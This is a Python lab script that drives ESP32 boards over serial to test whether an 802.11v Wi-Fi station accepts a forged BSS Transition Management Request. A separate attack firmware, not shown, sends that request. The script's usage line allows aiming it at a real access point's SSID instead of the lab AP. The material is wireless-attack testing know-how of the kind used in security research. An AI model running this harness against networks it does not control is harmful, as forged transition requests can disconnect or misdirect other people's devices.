"""BTM Request against a real 802.11v station (two or three boards).

    python lab/btm_sta.py --attack COM5 --sta COM10 --ssid timlab --ap COM6
    python lab/btm_sta.py --attack COM5 --sta COM10 --ssid <real AP SSID>   # no --ap

What it answers: "does a station that advertises 802.11v actually process and answer a
forged BTM Request?" The previous rounds could only prove that the frame leaves the
radio -- there was no 11v station on the bench (`wnmresp=0`).

Topology:

  COM10  ESP32-C5  lab/rf_throughput `sta <ssid>` + `btm 1`
                   (needs CONFIG_ESP_WIFI_11KV_SUPPORT=y; the STA then puts
                   Extended Capabilities bit 19 in its Association Request and
                   handles WNM action frames)
  COM6   ESP32     lab/rf_throughput `ap <ssid> <ch>`   (optional: omit --ap to use
                   an already-running AP of that SSID)
  COM5   ESP32-CYD this firmware: `WNM <idx> cand 10 0` -> forged BTM Request

Judgement, in order of strength:

  wnmc   > 0   the sniffer saw the station advertise 11v (capability learning works)
  wnmresp> 0   the station answered with a BTM Response  <- end-to-end success
  wnms         the status code in that answer (0 = accept, 1 = reject unspecified,
               6 = reject, no suitable BSS found, ...)

The station's own serial output is printed as well, so a disconnect/scan trace lines up
with the attack in time.
"""
import argparse
import sys
import time

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

import serial


class Port:
    def __init__(self, port):
        self.ser = serial.Serial(port, 115200, timeout=0.05)
        self.ser.dtr = False
        self.ser.rts = False
        time.sleep(0.3)
        self.ser.reset_input_buffer()

    def send(self, line):
        self.ser.write((line + "\r\n").encode())
        self.ser.flush()

    def read_line(self, timeout=0.05):
        deadline = time.time() + timeout
        while time.time() < deadline:
            text = self.ser.readline().decode("utf-8", "replace").rstrip("\r\n")
            if text:
                return text
        return None

    def expect(self, prefix, timeout=10.0):
        if isinstance(prefix, str):
            prefix = (prefix,)
        deadline = time.time() + timeout
        while time.time() < deadline:
            text = self.read_line(0.1)
            if text is None:
                continue
            if text.startswith(tuple(prefix)):
                return text
        return None

    def close(self):
        self.ser.close()


def status_of(attack):
    attack.send("STATUS")
    line = attack.expect("STATUS ", 5.0)
    info = {}
    if line:
        for token in line.split(" ")[1:]:
            if "=" in token:
                key, value = token.split("=", 1)
                info[key] = value
    return info


def scan_for(attack, ssid, tries=3):
    for _ in range(tries):
        attack.send("SCAN")
        deadline = time.time() + 25
        index = None
        while time.time() < deadline:
            text = attack.read_line(0.1)
            if text is None:
                continue
            if text.startswith("NET "):
                parts = text.split(" ", 6)
                if len(parts) >= 7 and parts[6].strip() == ssid:
                    index = int(parts[1])
            if text.startswith("SCAN_END"):
                break
        if index is not None:
            return index
        time.sleep(1.0)
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--attack", default="COM5")
    ap.add_argument("--sta", default="COM10")
    ap.add_argument("--ap", default=None, help="lab AP board; omit to use a real AP")
    ap.add_argument("--ssid", default="timlab")
    ap.add_argument("--channel", type=int, default=6)
    ap.add_argument("--seconds", type=float, default=8.0)
    args = ap.parse_args()

    board_ap = Port(args.ap) if args.ap else None
    board_sta = Port(args.sta)
    attack = Port(args.attack)
    try:
        if board_ap is not None:
            board_ap.send("clear")
            time.sleep(0.5)
            board_ap.send("ap %s %d" % (args.ssid, args.channel))
            print("ap:", board_ap.expect("AP listening", 15.0) or "no answer")

        board_sta.send("clear")
        time.sleep(0.5)
        board_sta.send("sta %s" % args.ssid)
        board_sta.send("btm 1")
        print("sta:", board_sta.expect("WIFI sta joining", 10.0) or "no answer")
        print("sta:", board_sta.expect("WIFI sta got ip", 25.0) or "no ip")
        print("sta:", board_sta.expect("STA connected", 20.0) or "no TCP stream")
        print("sta:", board_sta.expect("OK btm=1", 5.0) or "btm flag not applied")

        index = scan_for(attack, args.ssid)
        if index is None:
            print("attack board did not see '%s' in its scan" % args.ssid)
            return 1
        print("attack index=%d" % index)

        before = status_of(attack)
        print("before: wnm=%s wnmf=%s wnmc=%s wnmskip=%s wnmresp=%s"
              % (before.get("wnm"), before.get("wnmf"), before.get("wnmc"),
                 before.get("wnmskip"), before.get("wnmresp")))

        attack.send("WNM %d cand 10 0" % index)
        print("attack:", attack.expect(("OK WNM ", "ERR "), 6.0) or "no answer")

        deadline = time.time() + args.seconds
        while time.time() < deadline:
            text = board_sta.read_line(0.1)
            if text is not None:
                print("  sta:", text)
            text = attack.read_line(0.02)
            if text is not None and text.startswith(("INFO ", "RX ")):
                print("  atk:", text)
        after = status_of(attack)
        attack.send("WNMSTOP")

        print("\nafter: wnm=%s wnmf=%s wnmc=%s wnmskip=%s wnmresp=%s wnms=%s"
              % (after.get("wnm"), after.get("wnmf"), after.get("wnmc"),
                 after.get("wnmskip"), after.get("wnmresp"), after.get("wnms")))

        ok = int(after.get("wnmresp", "0") or 0) > 0
        print("\nRESULT: %s (wnmc=%s, wnmresp=%s, wnms=%s)"
              % ("station answered the forged BTM Request" if ok
                 else "no BTM Response -- check wnmc first (was 11v advertised?)",
                 after.get("wnmc"), after.get("wnmresp"), after.get("wnms")))
        return 0 if ok else 1
    finally:
        for port in (board_ap, board_sta, attack):
            if port is not None:
                try:
                    port.close()
                except Exception:  # noqa: BLE001
                    pass


if __name__ == "__main__":
    sys.exit(main())
